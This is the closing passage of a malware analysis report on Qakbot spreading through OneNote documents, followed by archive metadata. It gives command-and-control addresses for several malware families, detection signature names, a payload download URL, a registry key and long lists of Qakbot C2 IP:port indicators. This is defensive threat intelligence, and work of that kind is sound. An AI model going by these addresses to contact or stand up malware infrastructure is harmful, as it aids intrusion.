2023\n\n404.432\n\nbb12\n\n1675417198\n\nFebruary 3, 2023\n\n404.506\n\nbb15\n\n1676367197\n\nFebruary 14, 2023\n\n404.510\n\ntok01\n\n1676453967\n\nFebruary 15, 2023\n\nTable 5 Various campaigns of Qakbot using OneNote documents for malware distribution.\n\nVersion/Campaign\n\n\n-----\n\nC2\n\n0.5.7B\n\n207.244.236.205:6606\n207.244.236.205:7707\n207.244.236.205:8808\n\n3LOSH RAT\n\nxxxprofxxx.dnsdojo.com:5126\nxxxsthebagsxxx.mywire.org:6606\nxxxsthebagsxxx.mywire.org:7707\nxxxsthebagsxxx.mywire.org:8808\n\n0.5.7B\n\n209.126.83.213:6606\n209.126.83.213:7707\n209.126.83.213:8808\n\nTable 6 Various campaigns of AsyncRAT using OneNote documents for malware distribution.\n\nVersion/Campaign\n\nC2\n\n3954321778\n\nehonlionetodo.com\n\n\n-----\n\nTable 7 Icedid malware using OneNote documents for malware distribution\n\nC2\n\nsu1d.nerdpol.ovh:7000\n\nTable 8 Xworm malware using OneNote documents for malware distribution\n\n## Conclusion\n\nThis research presents an analysis of a new spreading vector of the Qakbot malware. It\nconsists of detailed analyses of OneNote malicious document, loader Qakbot DLL and its\nmain payload. We show how we deobfuscated and unpacked Qakbot and extracted their\nconfigurations.\n\nEven though these Qakbot campaigns do not seem to target a specific industry or territory,\nwe have seen a considerable number of infections in the United States, India, Turkey, and\nThailand. Based on our investigation, we believe that this tactic will continue to raise in other\ncampaigns. Threat actors will make attempts to bypass detection from security solutions by\nexploring other evasion techniques such as embedding other malicious Office types inside\nOneNote, or other classic executable file tactics: Java, Python, SCR, MSI, etc. We\nrecommend organizations and users to follow our proposed prevention and mitigation\ncountermeasures against this campaign.\n\n## Appendix\n\n### Trellix malicious OneNote campaigns and Qakbot detection signatures\n\nProduct\n\nSignature\n\nEndpoint Security (ENS)\n\nOne/Downloader.a.\nW32/PinkSbot-IH\nW32/PinkSbot-HZ\n\n\n-----\n\nW32/PinkSbot-IB\n\nEndpoint Security (HX)\n\nWERMGR LAUNCHED WITHOUT COMMAND LINE ARGUMENTS (METHODOLOGY)\nPOWERSHELL DOWNLOAD AT SUSPICIOUS PATH (METHODOLOGY)\nQAKBOT J (FAMILY)\n\nNetwork Security(NX)\nDetection as a Service\nEmail Security\nMalware Analysis\nFile Protect\n\nFE_Trojan_ONE_Generic_1\nFE_Trojan_ONE_Generic_2\nFE_Trojan_ONE_Generic_3\nFE_Trojan_ONE_Generic_4\nFE_Trojan_ONE_Generic_5\nFE_Trojan_ONE_Generic_6\nFEC_Downloader_CMD_Generic_1\nFEC_Downloader_CMD_Generic_2\nFEC_Trojan_HTML_Generic_48\nFEC_Trojan_HTML_Generic_49\nFE_Trojan_Win32_QAKBOT_2\nDownloader.CMD.Generic.MVX\nSuspicious EmbeddedObject Onenote Activity\nSuspicious Process Rundll32 Activity\nPolicy File ONENOTE with Embeded Object Delivered thru Emails\nSuspicious Network By Powershell\n\nHelix\n\nWINDOWS METHODOLOGY [Office Suspicious Child Process] (1.1.2497)\nWINDOWS METHODOLOGY [Rundll32 Abuse] (1.1.3992)\n\n### IoCs\n\n\n-----\n\nThe latest Qakbot hashes can be found in Trellix Insights under the various Qbot\nCampaigns.\n\nDLL payload URLs\n\nURL\n\nhttp://185.104.195.9/87084.dat\nRegistries\n\nURL\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\[RANDOM]\n\nQakbot C2 IP:port (timestamp 1676453967 February 15, 2023)\n\n75.143.236.149:443\n\n47.34.30.133:443\n\n103.212.19.254:995\n\n85.61.165.153:2222\n\n12.172.173.82:995\n\n217.165.186.116:2222\n\n103.231.216.238:443\n\n156.216.125.255:995\n\n86.96.72.139:2222\n\n181.118.206.65:995\n\n24.239.69.244:443\n\n\n-----\n\n188.83.248.76:443\n\n183.87.163.165:443\n\n68.108.122.180:443\n\n64.237.185.60:443\n\n98.145.23.67:443\n\n173.18.126.3:443\n\n2.50.48.213:443\n\n150.107.231.59:2222\n\n45.50.233.214:443\n\n77.86.98.236:443\n\n122.184.143.82:443\n\n24.71.120.191:443\n\n103.141.50.102:995\n\n82.127.204.82:2222\n\n73.165.119.20:443\n\n217.128.91.196:2222\n\n136.244.25.165:443\n\n\n-----\n\n41.230.174.134:443\n\n2.13.73.146:2222\n\n50.68.204.71:443\n\n90.104.22.28:2222\n\n46.27.231.50:2078\n\n162.248.14.107:443\n\n74.33.196.114:443\n\n27.109.19.90:2078\n\n114.79.180.14:995\n\n121.121.100.207:995\n\n86.207.227.152:2222\n\n75.98.154.19:443\n\n81.157.227.223:2222\n\n104.35.24.154:443\n\n86.130.9.232:2222\n\n62.35.67.88:443\n\n201.244.108.183:995\n\n\n-----\n\n124.122.56.144:443\n\n151.65.224.211:443\n\n190.75.132.158:2222\n\n85.241.180.94:443\n\n12.172.173.82:20\n\n184.176.35.223:2222\n\n2.99.47.198:2222\n\n67.187.130.101:443\n\n190.11.198.75:443\n\n109.150.179.236:2222\n\n172.248.42.122:443\n\n98.37.25.99:443\n\n73.29.92.128:443\n\n85.85.34.201:993\n\n82.212.115.188:443\n\n202.142.98.62:443\n\n93.156.99.48:443\n\n\n-----\n\n205.164.227.222:443\n\n190.206.75.58:2222\n\n47.149.78.242:443\n\n88.126.94.4:50000\n\n12.172.173.82:50001\n\n161.142.107.68:995\n\n86.250.12.217:2222\n\n35.143.97.145:995\n\n47.21.51.138:443\n\n188.49.125.169:995\n\n174.104.184.149:443\n\n58.247.115.126:995\n\n86.202.48.142:2222\n\n12.172.173.82:995\n\n125.99.69.178:443\n\n103.252.7.231:443\n\n76.170.252.153:995\n\n\n-----\n\n116.75.63.211:443\n\n86.225.214.138:2222\n\n73.161.176.218:443\n\n109.49.52.108:2222\n\n87.202.101.164:50000\n\n65.190.242.244:443\n\n92.97.197.177:2222\n\n86.195.14.72:2222\n\n24.206.27.39:443\n\n149.74.159.67:2222\n\n84.215.202.22:443\n\n116.72.250.18:443\n\n202.142.98.62:995\n\n95.255.60.223:995\n\n12.172.173.82:2087\n\n103.42.86.110:995\n\n74.92.243.113:50000\n\n\n-----\n\n176.142.207.63:443\n\n103.123.223.76:443\n\n90.213.146.227:443\n\n87.221.197.113:2222\n\n27.0.48.233:443\n\n103.144.201.53:2078\n\n89.129.109.27:2222\n\n92.27.86.48:2222\n\n27.0.48.205:443\n\n84.35.26.14:995\n\n213.67.255.57:2222\n\n88.126.112.14:50000\n\n12.172.173.82:465\n\n31.53.29.145:2222\n\n209.142.97.83:995\n\n50.68.204.71:993\n\n59.28.84.65:443\n\n\n-----\n\n108.2.111.66:995\n\n12.172.173.82:21\n\n136.232.184.134:995\n\n114.143.176.234:443\n\n12.172.173.82:990\n\n85.59.61.52:2222\n\n24.228.132.224:2222\n\n### Office 365 themed phishing campaign distributes Qakbot malware since February 22nd 2023.\n\n\n-----\n\nFigure 19 Attack vector of Office365 themed phishing in PDF attachment.\n\nVersion\n\nCampaign\n\nTimestamp\n\nConverted timestamp\n\n404.9\n\n\n-----\n\nBB16\n\n1677046917\n\nFebruary 22, 2023\n\nQakbot C2 IP:port (timestamp 1677046917 February 22, 2023)\n\n47.21.51.138:443\n\n76.80.180.154:995\n\n12.172.173.82:995\n\n72.80.7.6:50003\n\n12.172.173.82:32101\n\n70.77.116.233:443\n\n82.127.204.82:2222\n\n68.150.18.161:443\n\n162.248.14.107:443\n\n49.175.72.56:443\n\n68.173.170.110:8443\n\n\n-----\n\n75.98.154.19:443\n\n201.244.108.183:995\n\n24.9.220.167:443\n\n58.247.115.126:995\n\n122.184.143.82:443\n\n12.172.173.82:2087\n\n184.68.116.146:61202\n\n102.156.253.86:443\n\n50.68.204.71:993\n\n41.99.50.76:443\n\n74.58.71.237:443\n\n107.146.12.26:2222\n\n184.68.116.146:3389\n\n47.21.51.138:995\n\n81.229.117.95:2222\n\n72.203.216.98:2222\n\n77.86.98.236:443\n\n\n-----\n\n27.0.48.233:443\n\n103.252.7.231:443\n\n71.31.101.183:443\n\n69.133.162.35:443\n\n12.172.173.82:50001\n\n136.232.184.134:995\n\n59.28.84.65:443\n\n70.160.80.210:443\n\n86.225.214.138:2222\n\n76.170.252.153:995\n\n12.172.173.82:465\n\n95.242.101.251:995\n\n89.32.159.192:995\n\n12.172.173.82:21\n\n109.11.175.42:2222\n\n202.142.98.62:995\n\n47.34.30.133:443\n\n\n-----\n\n90.78.138.217:2222\n\n73.78.215.104:443\n\n202.187.232.161:995\n\n184.176.35.223:2222\n\n181.164.217.211:443\n\n98.147.155.235:443\n\n35.143.97.145:995\n\n92.97.203.51:2222\n\n124.122.56.144:443\n\n202.186.177.88:443\n\n116.74.164.26:443\n\n75.141.227.169:443\n\n114.79.180.14:995\n\n103.141.50.102:995\n\n103.144.201.53:2078\n\n86.150.47.219:443\n\n149.74.159.67:2222\n\n\n-----\n\n172.248.42.122:443\n\n183.87.163.165:443\n\n116.72.250.18:443\n\n12.172.173.82:990\n\n50.68.186.195:443\n\n125.99.69.178:443\n\n24.239.69.244:443\n\n190.75.95.164:2222\n\n202.142.98.62:443\n\n173.18.126.3:443\n\n98.145.23.67:443\n\n67.61.71.201:443\n\n73.165.119.20:443\n\n67.10.175.47:2222\n\n103.123.223.168:443\n\n90.104.22.28:2222\n\n71.212.147.224:2222\n\n\n-----\n\n80.13.205.69:2222\n\n14.192.241.76:995\n\n88.126.94.4:50000\n\n80.0.74.165:443\n\n74.33.196.114:443\n\n103.140.174.19:2222\n\n86.99.54.39:2222\n\n74.93.148.97:995\n\n103.231.216.238:443\n\n213.67.255.57:2222\n\n86.202.48.142:2222\n\n78.84.123.237:995\n\n176.142.207.63:443\n\n174.104.184.149:443\n\n180.151.108.14:443\n\n50.67.17.92:443\n\n12.172.173.82:20\n\n\n-----\n\n80.47.57.131:2222\n\n217.165.1.53:2222\n\n109.151.144.37:443\n\n198.2.51.242:993\n\n70.64.77.115:443\n\n104.35.24.154:443\n\n50.68.204.71:995\n\n2.50.47.74:443\n\n114.143.176.234:443\n\n205.164.227.222:443\n\n66.191.69.18:995\n\n84.35.26.14:995\n\n147.219.4.194:443\n\n75.143.236.149:443\n\n45.50.233.214:443\n\n77.124.6.149:443\n\n197.92.136.122:443\n\n\n-----\n\n64.237.185.60:443\n\n49.245.82.178:2222\n\n108.190.203.42:995\n\n73.161.176.218:443\n\n46.10.198.107:443\n\n50.68.204.71:443\n\n_This document and the information contained herein describes computer security research_\n_for educational purposes only and the convenience of Trellix customers. Any attempt to_\n_recreate part or all of the activities described is solely at the user’s risk, and neither Trellix_\n_nor its affiliates will bear any responsibility or liability._\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-03-07 - Qakbot Evolves to OneNote Malware Distribution.pdf"
    ],
    "report_names": [
        "2023-03-07 - Qakbot Evolves to OneNote Malware Distribution.pdf"
    ],
    "threat_actors": [
        {
            "id": "b4f83fef-38ee-4228-9d27-dde8afece1cb",
            "created_at": "2023-02-15T02:01:49.569611Z",
            "updated_at": "2025-03-27T02:00:03.114739Z",
            "deleted_at": null,
            "main_name": "TA577",
            "aliases": [
                "Hive0118"
            ],
            "source_name": "MISPGALAXY:TA577",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "96d5b301-0872-444c-ba32-eecf7a9241c0",
            "created_at": "2023-02-15T02:01:49.560566Z",
            "updated_at": "2025-03-27T02:00:03.112349Z",
            "deleted_at": null,
            "main_name": "TA570",
            "aliases": [
                "DEV-0450"
            ],
            "source_name": "MISPGALAXY:TA570",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "22d450bb-fc7a-42af-9430-08887f0abf9f",
            "created_at": "2024-11-01T02:00:52.560354Z",
            "updated_at": "2025-03-27T02:00:55.425961Z",
            "deleted_at": null,
            "main_name": "TA577",
            "aliases": [
                "TA577"
            ],
            "source_name": "MITRE:TA577",
            "tools": [
                "Pikabot",
                "QakBot",
                "Latrodectus"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1680660550,
    "ts_updated_at": 1743041774,
    "ts_creation_date": 1680510377,
    "ts_modification_date": 1680510377,
    "files": {
        "pdf": "https://archive.orkl.eu/65ca1efcc32c2144c34420d1483fd30514917371.pdf",
        "text": "https://archive.orkl.eu/65ca1efcc32c2144c34420d1483fd30514917371.txt",
        "img": "https://archive.orkl.eu/65ca1efcc32c2144c34420d1483fd30514917371.jpg"
    }
}